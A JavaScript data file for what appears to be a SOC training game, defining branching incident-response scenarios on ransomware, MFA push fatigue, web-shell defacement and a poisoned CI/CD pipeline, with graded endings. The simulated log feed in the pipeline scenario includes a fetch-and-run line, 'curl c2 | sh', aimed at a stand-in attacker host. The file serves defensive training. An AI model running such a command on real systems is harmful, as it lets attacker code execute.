/* SOC Range :: branch.data.js
 * Branching "live response" trees. Decisions, and how fast you make them,
 * change the outcome. Keyed by scenario id. Kept separate from the scenario
 * data so the static JSON build stays clean.
 *
 * tree: { intro, base, start, nodes:{ id:{ prompt, feed[], timeLimit, slow, options:[{id,label,delta,to,note}] } },
 *         endings:{ id:{ title, grade, text } } }
 * An option's `to` points to another node id or an ending id.
 */
(function () {
  var SOC = self.SOC || (self.SOC = {});
  SOC.branches = {

    "SC-T2-09": {
      intro: "Ransomware is unfolding on the finance VLAN in real time. Every second counts.",
      base: 70, start: "n1",
      nodes: {
        n1: {
          prompt: "EDR shows a host encrypting files and a 600 MB outbound transfer already in progress. What is your first move?",
          feed: ["SRV-FILE-01 Sysmon/11 FileCreate ext=.lockbvhn count rising", "fw01 ALLOW dst=exfil host bytes climbing"],
          timeLimit: 25, slow: "watch",
          options: [
            { id: "isolate", label: "Isolate the host from the network now", delta: 20, to: "n2", note: "Host contained, though some data already left." },
            { id: "block", label: "Block only the outbound IP at the firewall", delta: 5, to: "n2", note: "You slowed exfil, but the host keeps encrypting." },
            { id: "watch", label: "Keep monitoring to gather more evidence", delta: -25, to: "n3", note: "While you watched, the ransomware spread to two more servers." }
          ]
        },
        n2: {
          prompt: "The host is isolated. The transfer partially completed before you cut it. What is the priority now?",
          timeLimit: 25, slow: "restore",
          options: [
            { id: "scope", label: "Preserve evidence and scope what data left for breach analysis", delta: 20, to: "end_good", note: "You recognized this as double extortion." },
            { id: "restore", label: "Wipe and restore from backup immediately", delta: -10, to: "end_partial", note: "Availability is back, but the stolen data went unhandled." }
          ]
        },
        n3: {
          prompt: "Ransomware is now hitting multiple servers. Emergency action?",
          timeLimit: 20, slow: "none",
          options: [
            { id: "seg", label: "Isolate the entire affected VLAN segment", delta: 10, to: "end_partial", note: "Contained late; the damage is wider." },
            { id: "none", label: "Continue monitoring", delta: -20, to: "end_bad", note: "Encryption spread domain-wide." }
          ]
        }
      },
      endings: {
        end_good: { title: "Contained and scoped", grade: "A", text: "You isolated fast and understood that stolen data drives breach notification even when backups are clean. That is the modern ransomware playbook." },
        end_partial: { title: "Recovered, exposure missed", grade: "C", text: "Systems came back, but the exfiltration was under-handled. Recovery and disclosure are separate problems." },
        end_bad: { title: "Network-wide breach", grade: "F", text: "Hesitation let the ransomware spread across the domain. Speed of containment is the whole game here." }
      }
    },

    "SC-T1-10": {
      intro: "A user is being flooded with MFA push prompts from a foreign IP. They message the help desk, panicking.",
      base: 70, start: "n1",
      nodes: {
        n1: {
          prompt: "The user asks what to do about the endless MFA prompts. Your guidance?",
          feed: ["AAD SignIn mfaResult=PendingApproval pushCount=14 geo=foreign"],
          timeLimit: 20, slow: "approve",
          options: [
            { id: "deny", label: "Deny all, report, and revoke their sessions", delta: 20, to: "n2", note: "The push storm is contained." },
            { id: "approve", label: "Approve once so the prompts stop", delta: -30, to: "end_bad", note: "The attacker is now signed in as the user." },
            { id: "ignore", label: "Treat it as a glitch and ignore it", delta: -15, to: "n2", note: "Prompts continue and the risk remains." }
          ]
        },
        n2: {
          prompt: "Sessions are revoked. How do you prevent this from happening again?",
          timeLimit: 20, slow: "nothing",
          options: [
            { id: "harden", label: "Enable number matching or passkeys and reset the password", delta: 20, to: "end_good" },
            { id: "pwonly", label: "Reset the password only", delta: -5, to: "end_partial", note: "A password reset alone leaves the weak MFA in place." },
            { id: "nothing", label: "Do nothing further", delta: -15, to: "end_partial", note: "The same attack will work tomorrow." }
          ]
        }
      },
      endings: {
        end_good: { title: "Identity hardened", grade: "A", text: "You stopped the approval, contained the identity, and replaced blind approval with number matching. That defeats push fatigue for good." },
        end_partial: { title: "Contained, not hardened", grade: "C", text: "You stopped the immediate attack but left the weak MFA method in place." },
        end_bad: { title: "Account taken over", grade: "F", text: "Approving to make the prompts stop is exactly what the attacker wanted. Never approve to silence a push storm." }
      }
    },

    "SC-T2-13": {
      intro: "Your public homepage was just defaced. The web logs tell the story if you read them in order.",
      base: 70, start: "n1",
      nodes: {
        n1: {
          prompt: "Logs show an exploit, then a web shell, then a write to the index page. What do you do first?",
          feed: ["GET /vuln exploit 200", "POST /uploads/shell.php 200", "PUT /index.html 200 'owned'"],
          timeLimit: 25, slow: "reupload",
          options: [
            { id: "isolate", label: "Take the server offline and preserve the logs", delta: 20, to: "n2", note: "Attacker access cut, evidence intact." },
            { id: "block", label: "Block the attacker IP only", delta: 5, to: "n2", note: "Helps a little, but the shell is still resident." },
            { id: "reupload", label: "Just re-upload the original homepage", delta: -20, to: "end_bad", note: "The web shell remains and the page is defaced again within minutes." }
          ]
        },
        n2: {
          prompt: "The server is contained. How do you eradicate and recover?",
          timeLimit: 25, slow: "skip",
          options: [
            { id: "eradicate", label: "Remove the shell, patch the entry, rotate secrets, then restore", delta: 20, to: "end_good" },
            { id: "skip", label: "Restore the page and bring it back online", delta: -10, to: "end_partial", note: "You restored before eradicating the foothold." }
          ]
        }
      },
      endings: {
        end_good: { title: "Eradicated and restored", grade: "A", text: "You reconstructed the kill chain, removed the shell, closed the entry, and only then restored. That is the right order." },
        end_partial: { title: "Restored too soon", grade: "C", text: "The page is back, but rushing recovery before eradication invites reinfection." },
        end_bad: { title: "Re-defaced", grade: "F", text: "Re-uploading the homepage without removing the shell just hands the attacker a second turn." }
      }
    },

    "SC-AE-07": {
      intro: "A malicious build step was added to the production pipeline, and the build server is beaconing out. The next prod deploy runs in minutes.",
      base: 70, start: "n1",
      nodes: {
        n1: {
          prompt: "A compromised developer account injected a step that fetches and runs a remote script. The deploy is imminent. Action?",
          feed: ["ci-runner pipeline=deploy-prod step-added='curl c2 | sh' approval=bypassed", "build-server beacon dst=c2"],
          timeLimit: 25, slow: "ship",
          options: [
            { id: "halt", label: "Halt the pipeline and revert the change", delta: 20, to: "n2", note: "You stopped the deploy before it shipped." },
            { id: "disable", label: "Disable the compromised developer account first", delta: 10, to: "n2", note: "Good instinct, but the queued change is still dangerous." },
            { id: "ship", label: "Let the deploy proceed and investigate afterward", delta: -30, to: "end_bad", note: "You shipped the backdoor straight to production." }
          ]
        },
        n2: {
          prompt: "The pipeline is halted. What now?",
          timeLimit: 20, slow: "rerun",
          options: [
            { id: "rotate", label: "Rotate all pipeline secrets and require signed, reviewed changes", delta: 20, to: "end_good" },
            { id: "rerun", label: "Re-run the pipeline as-is to unblock the release", delta: -15, to: "end_partial", note: "The injected step or exposed secrets may still be live." }
          ]
        }
      },
      endings: {
        end_good: { title: "Pipeline secured", grade: "A", text: "You stopped the deploy, rotated the exposed secrets, and added change control. You treated CI/CD as crown-jewel infrastructure." },
        end_partial: { title: "Unblocked, still exposed", grade: "C", text: "You stopped the worst, but re-running without rotating secrets leaves the door ajar." },
        end_bad: { title: "Backdoor in production", grade: "F", text: "Shipping first and investigating later pushed attacker code to every production host." }
      }
    }

  };
})();
